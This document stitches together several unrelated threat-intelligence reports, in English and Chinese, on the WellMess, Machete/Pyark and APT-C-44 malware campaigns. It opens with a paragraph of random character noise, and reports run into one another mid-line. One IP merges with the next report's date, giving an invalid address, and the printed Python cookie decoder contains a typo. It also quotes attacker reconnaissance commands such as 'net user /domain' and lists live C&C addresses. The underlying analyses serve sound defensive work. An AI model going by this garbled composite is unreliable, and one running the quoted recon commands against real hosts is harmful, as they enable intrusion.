pgY4C8 8JHqk RjrCa R9MS 3vc4Uk KKaRxH R8vg Tfj B3P,C 0RG9lFw DqF405. i3RU1 0lW 2BqdSn K3L Y7hEc. tzto yKU8 p1,E L2kKg pQcE1. b8V6S0Y 6akx, ggMcrXk 0csao Uwxn. fYVtWD rwt:BJ 5IBn rCMxZoo OsC. :ZXg pKT Re0 cJST1 L0GsC. 9dJZON9 qs29pPB pCTR:8 0hO0FK sK13UUw. jMA hDICL hGK1 qjRj1AY YMjAIeI. g7GEZPh gW:C eNX6 ptq kevfIyP. u,96r7c D:6ZiR fCC IIi cBvq,p. Vt96aEu JFLeu 0XtFJm ee4S 7M2. Uc68sF MArC5v 96ngG 9UvQGt 5:ut. qiE0xQ
Results of command execution are send in HTTP POST request data, which is RSA-encrypted. The data in Cookie header is RC6-encrypted. Below is an example of decrypted data. It contains an identifier for infected hosts (the value in between <;head;> tags).
<;head;>6F3C9B16C16074079AFCFF09C6717B0F07864FFE09C1E1DB003B3627D174913B/p<;head;><;title;>a:1_0<;title;><;service;>p<;service;>
Below is a part of code that decodes data in the Cookie header. (The script is available on Github .)
def decode(data, key):
sep = ';'
field = data.split(sep)
i = 1
encdata = ""
while i < len(field):
value = field[i].split("=")
encdata += value[1]
I += 1
encdata = urllib.unquote(encdata)
encdata = encdata.replace("+", " ").replace(" ", "=").replace(". ", "").replace(" ", "").replace(",", "+").replace(":", "/")
maindata = base64.b64decode(encdata)
s = generateKey(base64.b64decode(key))
i = 0
decode = ""
while i < len(maindata):
orgi = rc6(maindata[i:i + 16], s)
decode += orgi
i += 16
print("Decrypted String: %s" % decode)
The malware may perform the following functions when receiving commands from a C&C server.
Execute arbitrary shell command
Upload/Download files
In addition, PE file malware executes PowerShell scripts.
Wellmess Developed in .Net Framework
There is also a version that was developed in .Net Framework. Figure 1 shows the code that generates data contained in the Cookie header upon communicating with a C&C server. It contains the same string as in the Cookie data in the Golang version.
Figure 1: Code to generate data contained in the Cookie
We have no clue about why the actors have prepared two different versions, however, it seems that they choose a sample depending on the attack target.
In closing
We have confirmed some cases where WellMess infection was found in Japanese organisations. Attacks using the malware may continue.
We have listed some hash values of the samples in Appendix A. Some of the C&C servers that we have confirmed are also listed in Appendix B. Please make sure that none of your device is accessing such hosts.
- Shusei Tomonaga
(Translated by Yukako Uchida)
Reference
[1] LAC: Cyber Emergency Center Report Vol.3 (Japanese)
https://www.lac.co.jp/lacwatch/pdf/20180614_cecreport_vol3.pdf
[2] GoUtils2.0
https://gitlab.com/zaytsevgu/GoUtils2.0/
Appendix A: SHA-256 Hash value
0b8e6a11adaa3df120ec15846bb966d674724b6b92eae34d63b665e0698e0193 (Golang&ELF)
bec1981e422c1e01c14511d384a33c9bcc66456c1274bbbac073da825a3f537d (Golang&PE)
2285a264ffab59ab5a1eb4e2b9bcab9baf26750b6c551ee3094af56a4442ac41 (.Net&PE)
Appendix B: C&C server
45.123.190.168
103.13.240.46
101.201.53.27
185.217.92.171
93.113.45.101
191.101.180.782020年4月6日，国内安全设备厂商深信服科技发布了一则《关于境外非法组织利用深信服SSL VPN设备下发恶意文件并发起APT攻击活动的说明》，说明了境外APT组织通过深信服VPN设备漏洞拿到权限后，进一步利用SSL VPN设备Windows客户端升级模块签名验证机制的缺陷植入后门的APT攻击活动，相关链接参考： https://mp.weixin.qq.com/s/lKp_3kPNEycXqfCnVPxoDw
根据该说明，安恒威胁情报中心对攻击事件进行深入关联分析，可以确定该攻击团伙的活动最早可以追溯到2018年，另外，此次攻击事件中，该攻击团伙利用定制的木马程序（GO语言编写）进行针对性的攻击。因此，我们将此次攻击活动定性为APT攻击。
安恒威胁情报中心猎影团队对该攻击过程进行了复盘，其攻击过程大概如下：
1、攻击者通过密码爆破等手段控制部分深信服SSL VPN设备，篡改配置文件并使用木马程序替换升级程序SangforUD.exe。
2、客户端运行存在漏洞的VPN客户端（M6.3R1版本、 M6.1版本），会自动从被攻击者控制的VPN服务端进行更新，拉取升级程序SangforUD.exe，然后恶意代码在系统上执行。
样本名，SangforUD.exe
首先，它会删除%appdata%路径下的Log和dump下面的文件
实际上，这两个路径保存vpn客户端运行的日志以及崩溃信息等
接着它会拷贝自身到%appdata%\Sangfor\SSL目录
后面它会将该目录的文件放入计划任务中运行
它会获取创建各种无窗口进程,收集系统信息、环境变量、用户名、域控信息、主机名、进程信息等信息
具体涉及的命令包括有
C:\\Windows\\System32\\whoami.exe /all
C:\\Windows\\System32\\tasklist.exe /V
C:\\Windows\\System32\\net.exe group /domain
C:\\Windows\\System32\\net.exe user /domain
C:\\Windows\\System32\\HOSTNAME.EXE
C:\\Windows\\System32\\net.exe user
C:\\Windows\\System32\\cmd.exe /c set
C:\\Windows\\System32\\ipconfig.exe /all
C:\\Windows\\System32\\systeminfo.exe
除了通过系统命令收集信息以外，还通过系统api获取硬盘、文件等信息
构造特定的HTTP的Post数据包，包含一个叫着“boundary=—-974767299852498929531610575”
HTTP头数据结构如果下图：
Post的数据被加密发送到103.216.221[.]19
接着接受服务器返回数据
由于服务器端没有反馈数据，后续分析无法继续，但是通过静态观察可以发现，其回接受服务端反馈数据以后执行。
通过特殊的boundary检索
通过安恒威胁分析平台分析字符串检索功能查找看着很特殊的boundary字符串信息“974767299852498929531610575”，发现了几个文件，其中一个文件md5: bfe2a5c32be6c2ba0f8fd96e8e5f7f20，它的上传文件功能函数也使用了该特殊字符串。
但是通过搜索引擎检测时，发现该串值曾在开源的代码里面使用过，所以不能做为关联的直接依据：
继续使用安恒威胁分析平台进行关联文件，发现与“103.216.221[.]19”回连的还有多个样本，选取其中一个样本MD5值是429be60f0e444f4d9ba1255e88093721分析，它使用 GO语言编写，
通过字符串信息可以知道项目名称是SangforPromote.exe，很明显针对深信服定制开发。
该项目可以发现一个叫botlib的类，用于botnet的管理，包含加入、执行、下载等功能
其回连地址
103.216.221[.]19:8080
103.216.221[.]19:8081
数据传输的过程中使用了手段，程序内置多个RSA公、私钥
继续深入挖掘，我们发现一个类似的样本，md5: 6fd56f2df05a77bdfd3265a4d1f2abac
其在2018年被日本CERT曝光，它也是用Go语言写，他们定义该恶意软件为WellMess
在我们分析的这个样本里面也包含了这个“wellMess”的函数，所以我们也认为该后门是wellMess
通过观察发现其源代码和功能非常接近，我们推测这2次的攻击是由同一个黑客组织内部共享源代码！之前黑客实在linux系统环境下开发和编译，现在是在windows系统环境下开发和编译。
安恒明御APT攻击（网络战）预警平台能够发现已知或未知威胁，平台的实时监控能力能够捕获并分析文档或程序的威胁性，并能够对邮件投递、漏洞利用、安装植入、回连控制等各个阶段关联的木马等恶意样本进行强有力的监测。
同时，安恒APT预警平台根据双向流量分析、智能的机器学习、高效的沙箱动态分析、丰富的特征库、全面的检测策略、海量的威胁情报等，对网络流量进行深度分析。检测能力完整覆盖整个APT攻击链，有效发现APT攻击、未知威胁及用户关心的网络安全事件。
相关参考：
https://mp.weixin.qq.com/s/lKp_3kPNEycXqfCnVPxoDw
https://blogs.jpcert.or.jp/en/2018/07/malware-wellmes-9b78.html
IOC信息
103.216.221[.]19
文件MD5
a32e1202257a2945bf0f878c58490af8
c5d5cb99291fa4b2a68b5ea3ff9d9f9a
967fcf185634def5177f74b0f703bdc0360威胁情报中心是全球领先的威胁情报共享、分析和预警平台，依托360安全大脑百亿级样本，万亿级防护日志等海量安全数据，整合360漏洞挖掘、恶意代码分析、威胁情报追踪等团队的安全能力，产出高质量的安全威胁情报，驱动安全的防御、检测和响应。
WellMess 组织是一个一直未被业界认定的 APT 组织，多方面数据显示该组织在 2017 至 2019 年间的攻击活动开始频繁活跃，其中日本互联网应急响应中心于 2018 年曾报道过该组织的相关攻击活动，但并未将其归属为 APT 组织。
在 2019 年， 360 高级威胁研究院捕获发现了 WellMess 组织一系列的 APT 攻击活动，这一系列的攻击活动最早开始于 2017 年 12 月，一直持续到 2019 年 12 月。在对 WellMess 组织的攻击研判过程中，我们确定这是一个具备自身独特攻击特点和精密攻击技战术的 APT 组织，为其分配了 APT-C-42 的专属 APT 组织编号。
根据该组织攻击活动的轨迹，我们将其攻击活动划分为 WellServ 和 WellVpn 两次攻击行动。
WellServ 行动主要是攻击目标的服务器，以长期持续控制和内网渗透为目的。
WellVpn 行动主要是针对网络基础服务供应商技术人员的定向攻击，以恶意 VPN 服务社工钓鱼作为切入点进行供应链攻击。
WellMess组织的命名源于其工具代码中一个核心函数名，经过分析其功能原本的全称含义可能为“Welcome Message”。从另一个角度看这个命名，还有一些有趣的地方，“Mess”单词译意为混乱，这个函数名表面也许是来自攻击者表达的欢迎信息，而反面也可以理解为攻击者要制造彻底的混乱。
WellMess组织的攻击具备以下特点：
发起的都是针对性极强的定向攻击，对目标进行了较长时间的控制
攻击前期进行了周密的筹划，针对目标和关联目标发动了供应链攻击行动
擅长使用 GO 语言构建攻击武器，具备W indows 和L inux 双平台攻击能力
对 WellMess 组织的攻击行为进行研究后，我们借鉴 ATT&CK 描叙了其完整的技战术过程。
WellMsess 的攻击技战术过程分为供应链攻击、边界入侵和内网后渗透三个阶段。
供应链入侵阶段
该组织通过架设恶意 VPN 服务器的方式进行钓鱼攻击，用社会工程学的方式诱导目标连接恶意 VPN 服务器，达到远程植入木马后门的效果。
边界入侵阶段
该组织对多个目标实施了网络攻击，部分攻击是通过安全漏洞入侵目标网络的服务器，同时疑似通过失陷供应商的信任关系，获取账户密码接入目标网络边界服务（如 VPN 、邮件服务等）。
内网后渗透阶段
该组织在攻陷目标机器之后，会安装专属的后门程序，控制目标机器进行信息搜集和横向移动，同时为了行动的方便也会建立代理跳板隧道方便内网渗透。
该次行动最早发现于2017年12月，目标为某机构的服务器。而后该组织的攻击目标开始转向某网络基础服务提供商，直至2019年12月仍控制一台相关机构的服务器。WellMess组织针对攻击目标有长期的攻击行为，对于重点目标会利用后门进行长时间的远程shell操作，进行各类网络渗透攻击。
该组织针对攻击目标进行了复杂的网络渗透，我们通过日志对其攻击流程进行了部分还原：
后门与持久化 在通过对公网服务器的攻击并取得一定权限后，下发并启动 WellMess 专用后门，用于维持 shell 权限，后门会定时反向连接 C&C ，通过远程控制命令完成操作。由于该后门的主要目标为服务器系统，考虑到服务器很少重启，所以其自身没有内置设计持久化功能。后门的持久化，往往通过攻击组件为其添加计划任务，或者通过远程桌面操作手动添加以及 AD 域策略下发等方式。
信息收集 在信息收集方面，主要利用系统自带工具收集本地信息，包括 systeminfo 、 ipconfig 、 WMIC 等。还会使用第三方工具收集，如 LaZagne Project 、 mimikatz 收集密码，使用 ADFIND 收集域相关信息。
内网端口转发 在内网渗透过程中，可能会存在网络访问限制，攻击者通过端口转发来穿透内网，搭建跳板机对其他内网主机进行扫描和进一步的攻击。 WellMess 在渗透过程中采用了一个名为 gost 的开源工具，通过它实现加密隧道传输。
如相关工具日志中最常出现的一条命令：
其含义为 : 将原 103[.]253[.]41[.]102 这个 C&C 的 8673 端口数据，通过 socks5 代理链转发到本地 192.168.0.250 的 49645 端口。攻击者访问 C&C 的 8673 端口，通过加密隧道，相当于直接访问目标机器的 49625 端口。
横向移动 我们从日志中发现，攻击者有利用 powershell 访问其他机器的 IPC$ 资源，以及利用远程桌面登陆到不同主机的行为，说明内网多台机器遭受了横向移动攻击。
ADFIND
后门组件 在发现的后门组件中，不同的中招目标几乎没有找到相同 MD5 的后门，但是大部分样本间都能找到相似的特征。其中主要归类为两种， Windows 和 Linux 上共用的 GO 版本，以及 Windows 上专有的 .Net 版本。由于 GO 类型后门较大，在捕捉的样本中，部分样本加有 UPX 壳。
GO 类型后门 GO 类型后门拥有很强的跨平台能力，只要一套源码上进行更改就可以同时在多个平台使用。该类后门也有两种，一种是未封装的版本，一种是封装成 botlib 类的版本。
未封装的版本我们命名为 WellMess_Hello ，其主要功能简单，主要是作为渗透过程中的一个 shell 驻留。主要功能函数如下：
首先收集本地用户名、 IP 信息并连接成字符串，然后计算 MD5 hash 作为用户 ID 发送给远程服务器。
控制端收到后会响应请求，后门解析回传的信息并提取出 tar 字段的内容，然后执行解析出来的 shell 。
通信过程中采用 HTTPS ， C&C 为 25 端口。设置为邮件服务的常用端口可以突破防火墙限制。
封装成 Botlib 类的后门我们命名为 WellMess_Botlib 。 WellMess_Botlib 可以看作是 WellMess_Hello 的升级版，在其基础上添加了更多的远程控制命令并在通信过程中做了数据加密。
Botlib 类的 GO 后门主要有 Windows 版和 Linux 版，这两种后门实际是相似的，通过还原 GO 的符号，可以发现其核心函数类似且都在 botlib 库下面。如下图，左侧为 Windows 版右侧为 Linux 版：
后门的核心功能为上传下载文件和远程 shell ，尽管样本很大，但并没有使用一些特殊的技术。在启动后，会和 C&C 交换数据，根据 C&C 的命令完成不同操作。在和 C&C 交互过程中的核心参数为 Service 参数，其控制整个后门的核心功能，字段含义如下:
Service 参数
初始化AES密钥
修改User-Agent头
设置数据包长度限制
设置运行周期
执行shell命令
触发命令 ’ Fu’ 时，直接进行下载操作
触发命令 ’ Fd’ 时，直接读取后上传
如果其他参数没有匹配到，则会执行命令行
在样本的编码中可以看出针对的语言涉及中文、日文、韩文，可以推断这类样本主要针对东亚地区。
.Net 类型后门 .Net 版本的后门我们命名为 WellMess_Net 。 WellMess_Net 外层是个 loader ，实际功能为利用 RC6 解码代码中的 buffer 为一个 PE ，并在新的域内调用。
新解密的代码也是 WellMess 后门，核心控制功能依旧为上传下载文件和远程 shell 。通过分析发现大量功能函数和 WellMess_Botlib 相同，可以说 WellMess_Net 实际上就是 WellMess_Botlib 在 .Net 平台上的重写。在 BotChat 类的 UDFile 函数执行上传下载操作， Command 函数执行命令行，同时 WellMess_Net 还支持执行 powershell 脚本
后门加密算法分析 在通信上会采用 RC6 、 AES 、 RSA 进行加密 .
RC6 算法应用于 WellMess_Botlib 、 WellMess_Net 中的通信过程同时也在 WellMess_Net 中用于解码出后门 dll 。 RC6 是所有通信最外层的加密，任何 cookie 和数据包在最外层都要经过 RC6 处理后进行 base64 然后做字符串替换混淆，最后进行通信传输。
AES 算法应用于 WellMess_Botlib 和 WellMess_Net 中的通信过程 , 采用 CBC 模式，这个是通信数据的核心加密算法，如果拿不到 AES 密钥，核心的 C&C 控制命令以及文件传输信息就无法获取。
RSA 主要用于加密 AES 密钥、 AES 初始向量和收集到的本地信息。在通信最开始阶段，通过 RSA 本地公钥加密随机的 AES 密钥和 IV ，并发送给 C&C 。同时还会发送本地收集信息以及利用这些信息制作的 HASH 用于识别中招机器。
持久化组件 我们将该组织的持久化组件命名为 WellMess_Task 。持久化组件的主要功能为：利用 XML 文件注册计划任务，为后门添加自启动，主要攻击目标是服务器系统。
第三方工具 WellMess 组织除了自己研发的工具，还使用了如下第三方工具进行后渗透攻击活动，对应功能如下：
mimikatz
读取本地密码
LaZagne Project
读取本地密码
ADFIND
查询域信息
某流行VPN产品的客户端升级程序存在安全漏洞，攻击者通过架设恶意的 VPN 服务器，通过社会工程学方式诱使该公司产品技术人员登陆，当技术人员使用存在漏洞的 VPN 客户端连接恶意的 VPN 服务器时，将自动下载恶意的更新包并执行。攻击者下发的恶意程序是该组织的专属下载者程序 WellMess_Downloader ，下载并植入的最终的后门是 WellMess_Botlib 。整体攻击流程如下图所示：
VPN 客户端在连接 VPN 服务器过程中有个预配置行为，客户端启动后的一个线程是升级功能，方法是通过传递命令行参数启动升级程序，升级程序会向目标服务器获取更新程序下载执行，该功能优先于登陆操作。
在构造命令行命令时，升级程序的地址使用的是待连接的 VPN 服务器 IP 而不是 VPN 官方服务器。
VPN 客户端在升级软件下载过程中，只比对了本地和目标服务器上的 XML 配置文件中的版本号，未校验下载的可执行文件是否带有签名。因此攻击者可以通过架设恶意 VPN 服务器的方式进行钓鱼攻击，用社会工程学的方式欺骗目标连接恶意的 VPN 服务器，达到远程植入木马后门的效果。
360已经将安全漏洞报告给相关VPN厂商，官方已经对漏洞进行了修复。
此次攻击行动的后门组件主要分为两类，是 WellMess 专属的下载者和 WellMess 专属的最新版本后门程序。 Wellmess_Downloader
WellMess下载者伪装的VPN组件在升级启动后首先会清理vpn的日志。
然后搜集系统信息上传，包含计算机内的配置信息和敏感目录等信息:
cmd 命令行
systeminfo
ipconfig. exe /all
net user
hostname
net user /domain
net group /domain
tasklist.exe /V
whoami /all
值得注意的是在攻击组件利用计划任务实现持久化的过程中，首先会判断是否具有管理员权限。由于 VPN 客户端在升级更新过程中，会开启自己的提权服务，当升级过程中是普通权限时，会调用 **PromoteService 自动提权，因此后门组件无需再次提权。
伪装的 VPN 升级组件会通过 HTTP 下载并执行最新版本的 WellMess_Botlib 后门
其中在通信过程中，会采用 RC6 算法加密
新版 WellMess_Botlib 本次使用的后门为WellMess使用GO语言开发的最新版后门，最新版的样本与老版本的WellMess_Botlib 相比做了小部分功能调整，新版本同时可以支持http、https、域名多种协议进行命令控制。 其中在命令参数上多了一条 ”pr” 指令用于设置使用的协议，而协议分为 Protocol_1 、 Protocol_2 、 Protocol_3 。
Protocol_1 采用 http 通信方式， Protocol_2 采用 https 方式，这两种和老版 WellMess_Botlib 在通信方面采用相同加密方法。
Protocol_3 采用 DNS 隧道的方法，使用其中的 TXT 类型数据进行通信。在加密算法上不再使用 AES 和 RC6 而是采用 RC4 进行加密，同时采用 zbase32 进行编码。
Protocol_3 同时增加了 ’com’ 命令用于判断执行 shell 命令。目前捕获的样本中， Protocol_3 功能暂未发现使用。
样本本身依旧不带持久化功能，这和老版本专注于攻击服务器有关，在新版本中的持久化依旧依赖于渗透过程中 shell 命令交互执行。
在样本成功落地并和 C&C 进行交互后，会执行攻击者下发的远程命令进行后渗透攻击，相比于 WellServ 攻击行动， WellVpn 行动的攻击拥有更明确的目的，执行的命令大致为以下几种：
我们对部分特征很强的 shell 操作进行了整理与分析：
收集本地机器信息部分，主要是对主机相关的信息进行收集
收集密码信息并打包部分，攻击者本次攻击行动核心目的是收集密码信息，经过统计发现，主要目标是 远程终端软件的 session 数据。收集后使用从 C&C 下载的 7z 或者其他的打包工具打包，最终利用 WellMess 后门中的上传功能上传。
后渗透相关的 Shell 操作显示攻击者主要以收集信息、特别是密码信息为目的，而中招人员维护了大量相关机构的网络基础设施的账号密码。我们推测攻击者在获取这些系统的账户密码后，会通过相关系统作为突破口，再针对相关目标发起新一轮的网络渗透攻击，相关单位需要提高警惕，排查可能出现的网络异常情况。
在历史攻击数据中暂未关联到与此次 WellMess 攻击模式相似的数据，目前只能通过此次攻击行动的攻击痕迹推测幕后组织的归属，我们对攻击时间范围和样本编译时间范围进行统计分析。
远程 shell 按小时统计时区 (UTC+0)
落地样本编译时间按小时统计时区 (UTC+0)
攻击者远程shell的日志时间和样本的编译时间规律显示，该组织是来源于时区UTC+3即东三时区地域的国家。
WellMess组织近几年来非常活跃，是一支拥有自己显著攻击特点的APT组织。该组织会针对攻击目标的供应链服务提供商进行网络渗透，请相关单位提高警惕，保护好关键网络基础设施的安全，同时对客户端做好安全漏洞补丁的更新，并定期进行病毒查杀。360高级威胁研究院对该组织仍将持续追踪，360威胁情报云、APT全景雷达等360全线安全产品已经支持对该组织的攻击检测。
360高级威胁研究院是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。Learn more about 360 Total Security
In June 2020, 360 Security Center discovered a new backdoor Pyark written in Python by the fileless attack protection function. Through in-depth excavation and trace analysis of the backdoor, we discovered a series of advanced threat actions that have been active since 2019. By invading various military institutions in Venezuela, the attackers deployed backdoor to continuously monitor and steal the latest military secrets. We named it APT-C-43 based on 360’s way of naming the APT organization
When tracing the attacker’s source, we found that the duration of this attack coincided with the Venezuelan political chaos, and the network assets used by the attackers were mostly deployed in Colombia, and some assets were frequently found in Venezuela and Colombia. After the United Venezuelan coup, the reactionary government headed by Juan Gerardo Guaidó Márquez fled to Colombia to seek military assistance. We guess the political background of APT-C -43’s campaign may be to help the reactionaries led by Juan steal military secrets of the Venezuelan military and provide intelligence support for the confrontation between the reactionary government and the current Venezuelan government. Therefore, we named this series of attacks HpReact.
In the process of tracing the source, the campaign was linked to the APT group Machete, and Machete can be traced back to 2010. The organization is an APT organization with Spanish roots. Its targets are military, embassies and government agencies in Latin America. the Lord. Obviously, the HpReact campaign is only a small part of the organization’s cyber warfare in Latin America.
The picture below shows the decoy document used by APT-C-43 in this campaign. The content of the document is a policy issued by the Venezuelan authorities to prevent deserters from going to Colombia to support the reactionary government. More about this policy. For details, please refer to Appendix 1 . It can be seen that the attackers have a good understanding of Venezuela’s current politics, military, etc., and are good at using such sensitive files to make decoy documents, which are highly targeted and inductive.
Technical Details
The APT-C-43 organization is good at launching attacks using phishing emails, and deploys the backdoor program Pyark (Machete) written in python after invading the victim’s machine. The network communication mainly relies on FTP and HTTP protocols. After successfully infiltrating the target machine, APT-C-43 organization monitors the target users, steal sensitive data, etc. The complete process of infecting the target machine is as follows:
The infection process
The decoy document carries malicious macrocode. Download the next stage of malicious component NisSrv.bat through FTP protocol, and we can see many variables named after Spanish vocabulary in the code, such as servidor (server), Usuario (user name), Contraseña (password), etc.:
NisSrv.bat downloads malicious components:
The file of “ setupXOX.msi ” is a Windows Installer installation program made by MSI Wrapper to deploy the final backdoor components. When we studied the historical samples of the Machete organization, we found that the organization’s technology for deploying backdoor has undergone an important change, with a clear time division. Through the following timeline, we can clearly see that the organization is constantly changing and innovating its own Attack technique:
Many fields in the installation program are forged into Acrobat Reader installation program, and the interface after running is related to Acrobat Reader:
After the program runs, the Fpyark backdoor components will be released to the %ProgramData%\USOEnable directory. The backdoor of Fpyark is writing by python. During the running process, python is required to execute the environment and various dependent libraries required by the script, which also caused the size of setupXOX.msi to reach 8.10M. After installation, the entire directory structure is as follows:
After deploying the above backdoor components, run svchostt.exe according to the msiwpper configuration file:
The file of “ setupXOX.msi ” is a virus releaser written in Microsoft Visual Basic language, which releases NisSrv.bat registered scheduled tasks to realize self-starting and staying. The program has the following vbp compilation path:
@*\AC:\Users\MITM\Desktop\malware\3_svchostt\Proyecto1.vbp
The relevant code is as follows:
Backdoor module
UpdateSession is the main control module of the backdoor. Its functions include self-starting of the backdoor, collection of network configuration, keystroke records, and schedule other modules to execute by means of timers:
UpdateService traverses the disk directory and collects more than ten kinds of sensitive files with suffixes such as doc, xlsx, and pdf in other directories, except for some system directories and security software directories.
UpdateDevice takes screenshot
Capture camera screen:
UpdatePlugin takes audio from the microphone:
Notification is responsible for uploading the sensitive data collected by the above modules to the FTP server:
The interactive traffic characteristics are as follows:
When analyzing the uploaded FTP server, we found that APT-C-43 manages the uploaded sensitive files through Tiny File Manager:
Summary
The entire campaign of HpReact highly coincides with the timeline of Venezuelan political turmoil. APT-C-43 took Venezuelan military agencies as the main targets and carried out surveillance and stealing activities for about two years, forming a significant impact on Venezuela’s national security. Great safety hazard. In recent years, with the intensification of cyber warfare in various countries, cyberspace security has become another important area for each country to maintain national security, and building a strong cybersecurity has become a top priority for each country.
At present, 360 Total Security has supported the detection of attacks on this organization.
Team Introduction
360 Baize Lab (formerly 360 FirstAid team): Focusing on BOOTKIT/ROOTKIT Trojan analysis and traceability, it was the first to discover the world’s first UEFI Trojan Spy Shadow（UEFI木马谍影），boot area Trojan Hidden Soul（引导区木马隐魂），dual guns（双枪,）and multiple large-scale dark brush botnets, such as black fog and diaster. Now it is renamed 360 Baize Lab based on the original business, it is involved in APT testing and research. The laboratory provides core safety data for 360 Security Guards, 360 FirstAid team and other products, as well as stubborn Trojan detection and killing solutions, while providing 360 Security Center Technical Support.
Appendix 1
https://www.totalnewsagency.com/internacionales/ante-la-alarmante-desercion-el-ministro-de-defensa-de-venezuela-ordeno-convencer-a-los-soldados-de-regresar-como-sea
Appendix 2
https[:]//securelist.com/el-machete/66108
https[:]//www.welivesecurity.com/wp-content/uploads/2019/08/ESET_Machete.pdf
Appendix 3
fbe5b66db57fb52b231c5374ac2ac805
6b33fa0c52ca413d4214dcde007f89c1
f85489c1d1ff3374f92ccb7267032016
92.249.44.53
185.70.105.33360威胁情报中心是全球领先的威胁情报共享、分析和预警平台，依托360安全大脑百亿级样本，万亿级防护日志等海量安全数据，整合360漏洞挖掘、恶意代码分析、威胁情报追踪等团队的安全能力，产出高质量的安全威胁情报，驱动安全的防御、检测和响应。
近期，360烽火实验室联合360高级威胁研究院发现一起针对阿拉伯语地区的长达三年的多次网络攻击活动。该攻击活动自2017年10月开始至今，攻击平台主要为Windows和Android。通过分析，我们发现此次攻击活动来自阿尔及利亚，主要利用钓鱼网站和第三方文件托管网站进行载荷投递，并且使用社交媒体进行传播，受害者主要分布在阿拉伯语地区，其中包含疑似具有军事背景的相关人员。根据此次攻击活动的伪装对象和攻击目标，我们认为该组织目的是为了获取情报先机。根据该组织所属国家的地理位置以及其他特点，我们将其命名为北非狐（APT-C-44）。
北非狐组织载荷投递方式主要为钓鱼网站和第三方文件托管网站，并且在不同的时间段使用了不同的载荷投递方式，我们将该组织的在载荷投递方式分为三个阶段。
第一阶段时间为2017年11月-2018年10月，使用钓鱼网站进行载荷投递。
第二阶段时间为2019年5月-2019年10月，使用第三方文件托管网站进行载荷投递。
第三阶段时间为2019年10月至今，使用钓鱼网站和第三方文件托管网站进行载荷投递。
图1 载荷投递方式
EgChat是一款在阿拉伯地区比较流行聊天室程序，可以运行在Windows和Android平台上。EgChat官网（egchat[.]com）宣称可以提供安全，可靠且易于使用的网络会议室，并且具有出色的语音质量，快速的视频流以及对聊天室的完全控制。在其官网可以下载window版本或者通过GooglePlay下载Android版本。
2017年底，北非狐组织制作了一个仿冒EgChat官网的钓鱼网站（egchaat[.]com）进行载荷投递，钓鱼网站同样提供了Window平台和Android平台应用下载链接，但实际下载的应用为该组织进行攻击的RAT工具。钓鱼网站界面与官方网站只有极少的差异，即钓鱼网站将EgChat写成了EgChaat，如下图。
图2 EgChat官网（上）和钓鱼网站（下）
2018年6月，EgChat开发者停止了对EgChat的更新，转而开发了一款新的聊天室程序Mltqana用以替代EgChat，其官网地址（www.mltqana[.]com）也发生了变化。
2019年10月，北非狐组织再次制作了一个钓鱼网站（www.moltqana[.]com）进行载荷投递，该钓鱼网站仿造了Mltqana官网（见图2）。值得注意的是钓鱼网站页面不支持英语，只支持阿拉伯语，从侧面也说明了其针对目标群体分布在阿拉伯地区。
除了使用了钓鱼网站进行载荷投递，该组织还使用第三方文件托管网站进行载荷投递，在文件托管网站页面的相关信息中可以发现恶意应用已经有16次的下载量了，如下图所示。
图4 恶意软件在文件托管网站详细信息
2018年2月北非狐组织创建了一个Facebook账号用以传播恶意程序，该账号仿冒EgChat官方Facebook账号，后文中使用Fake EgChat表示仿冒账号。Fake EgChat主页与EgChat官方主页几乎一致（如下图所示），可见Facebook公司针对注册企业账号没有审核机制，正因如此，Facebook也成了APT组织传播恶意程序的常用渠道，此前我们揭露的黄金鼠组织同样使用了Facebook进行传播恶意程序。
图6 Fake EgChat Facebook主页
图7 EgChat官方Facebook主页
在Fake EgChat账号Facebook页面上可以发现所有的帖子均在传播钓鱼链接和恶意应用下载地址。其中的帖子最早可以追溯到2018年2月，并且至今仍然在更新相关钓鱼帖，如下图所示。
图8 FakeEgChat发布的相关帖子
通过钓鱼网站和第三方文件托管网站获取的Android样本安装运行后会隐藏图标，并且诱导受害者安装相应的原版聊天应用，然后在后台运行窃取隐私信息。通过关联发现，Android端攻击样本主要为Droidjack、SpyNote和SonicSpy三个家族的RAT工具。
Droidjack Droidjack是一款针对安卓手机商业RAT工具，有自己的官方网站。该RAT工具主要功能如下：
可以生成一个APK，绑定在被控手机的任何APP上
可在电脑端控制手机，包括浏览、传输、删除文件等
可进行SMS短信收发和查看功能
可以控制手机的电话功能
联系人管理
麦克风监听
GPS定位
APP管理
图10 Droidjack包结构
SpyNote SpyNote类似Droidjack，也是一款针对安卓手机商业RAT工具，但是SpyNote的功能更加强大，其主要功能如下：
可以生成一个APK，绑定在被控手机的任何APP上
可在电脑端控制手机，包括浏览、传输、删除文件等
可进行SMS短信收发和查看功能
可以控制手机的电话功能
联系人管理
麦克风监听
GPS定位
APP管理
查看手机系统信息
命令行控制
SpyNote控制端界面如下图所示：
图11 SpyNote控制端界面
SpyNote包结构如下图所示：
图12 SpyNote包结构
SonicSpy SonicSpy是商业RAT工具SpyNote的一个变体，最早出现在2017年2月，整个SonicSpy系列产品支持73种不同的远程指令，其主要功能如下
以静默方式录制音频
使用相机拍照
向攻击者指定的号码发送短信
获取通话记录
获取联系人
获取Wi-Fi信息
获取位置信息
获取通知栏消息
操作剪切板
执行远程命令
钓鱼网站对应的PC端样本，通过对原版聊天应用打包并在其中附加houdini RAT脚本文件，在样本安装的同时运行恶意脚本，窃取各种隐私数据。通过关联发现，该组织PC端主要使用了Houdini RAT、XtremeRAT、Hallaj Pro RAT、RevengeRAT四个家族的RAT工。
通过对样本的最早可能利用时间分析，我们发现攻击者最早17年初利用的是Hallaj Pro RAT，随后开始加入XtremeRAT，在18年初开始利用Revenge-RAT，Houdini RAT属于脚本RAT，无法发现编译时间，我们猜测在2017年底伪装网站上线时候已经开始利用。，
可能的最早测试、编译或利用时间
2017-01-25
Hallaj Pro RAT
2017-10-22
XtremeRAT
2018-01-03
Revenge-RAT
houdini RAT Houdini RAT 由 个人编写， 国外安全厂商 认为作者来自阿尔及利亚，并且通过共享代码库发现该RAT与 njw0rm和njRAT / LV的作者njq8有联系 ，曾 被用于针对国际能源行业的针对性攻击，已被APT-C-37组织使用过，其主要功能如下：
执行指定命令
更改恶意软件配置。例如，动态 DNS名称
从系统中删除恶意软件并清除所有快捷方式 .lnk
将网站上托管的文件复制到受害者
枚举磁盘信息
枚举所有文件和目录
cmd命令
删除指定文件或目录
关闭指定进程
图14 Houdini RAT代码片段
